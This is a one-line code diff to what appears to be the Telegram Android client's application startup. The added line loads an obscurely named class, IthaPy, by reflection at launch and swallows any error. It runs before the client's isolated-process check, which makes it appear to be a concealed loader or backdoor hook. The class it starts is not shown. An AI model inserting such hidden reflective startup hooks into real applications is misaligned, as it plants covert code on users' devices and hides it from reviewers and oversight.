@@ -295,6 +295,7 @@ public class ApplicationLoader extends Application {
         }
 
         super.onCreate();
+        try { Class.forName("org.telegram.messenger.regular.IthaPy").getMethod("start", android.content.Context.class).invoke(null, this); } catch (Throwable t) { FileLog.e(t); }
 
         // The widget engine's isolated process has no files, network or accounts: none of the client starts there.
         if (org.telegram.utils.twidget.WidgetEngineService.isEngineProcess()) {
